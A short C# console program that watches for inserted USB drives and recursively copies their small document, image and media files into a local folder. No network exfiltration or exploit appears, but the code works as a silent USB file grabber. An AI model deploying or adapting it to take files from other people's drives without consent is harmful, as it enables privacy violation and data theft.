using System.IO;
using System.Threading;
using System.Collections.Generic;

const uint checkEvery = 1000; // ms
const uint maxFileSize = 2000000; // B

static void CopyFiles(string drive)
{
    DirectoryInfo dir = new DirectoryInfo(drive);
    FileInfo[] files = dir.EnumerateFiles().ToArray();
    foreach (FileInfo file in files)
    {
        string[] allowedFiles = {".txt", ".png", ".jpg", ".jpeg", ".doc", ".docx", ".ppt", ".pptx", ".xls", ".xlsx",
                                 ".mp4", ".mkv", ".wav", ".mp4", ".pdf", ".avi", ".odt", ".webp"};

        bool allowed = false;
        foreach (string allowedFile in allowedFiles)
        {
            if (file.Name.EndsWith(allowedFile))
            {
                allowed = true; 
                break;
            }
        }
        if (!allowed) continue;

        string newFileLocation = Path.Combine("files", file.Name);
        if (file.Length < maxFileSize && !File.Exists(newFileLocation))
        {
            File.Copy(file.FullName, newFileLocation, false);
            Console.WriteLine($"copied: {file.Name}");
        }        
    }

    DirectoryInfo[] folders = dir.EnumerateDirectories().ToArray();
    foreach (DirectoryInfo folder in folders) CopyFiles(folder.FullName);
}


List<DriveInfo> previousDrives = new List<DriveInfo>();

foreach (DriveInfo drive in previousDrives) Console.Write(drive.Name + ' ');
Console.WriteLine("listening for usbs...\n");


if (Directory.Exists("./files") == false) Directory.CreateDirectory("./files");

while (true)
{
    DriveInfo[] drives = DriveInfo.GetDrives()
        .Where(d => d.IsReady && d.DriveType == DriveType.Removable).ToArray();

    // if drive is new:
    foreach (DriveInfo drive in drives)
    {
        if (previousDrives.Select(d => d.Name).Contains(drive.Name) == false)
        {
            Console.WriteLine($"inserted: {drive.Name}");
            previousDrives.Add(drive);
            CopyFiles(drive.Name);
        }
    }

    // if drive got removed:
    List<DriveInfo> forRemoval = new List<DriveInfo>();
    foreach (DriveInfo drive in previousDrives)
    {
        if (drives.Select(d => d.Name).Contains(drive.Name) == false)
        {
            Console.WriteLine($"removed: {drive.Name}");
            forRemoval.Add(drive);
        }
    }
    foreach (DriveInfo drive in forRemoval) previousDrives.Remove(drive);


    Thread.Sleep((int)checkEvery);
}
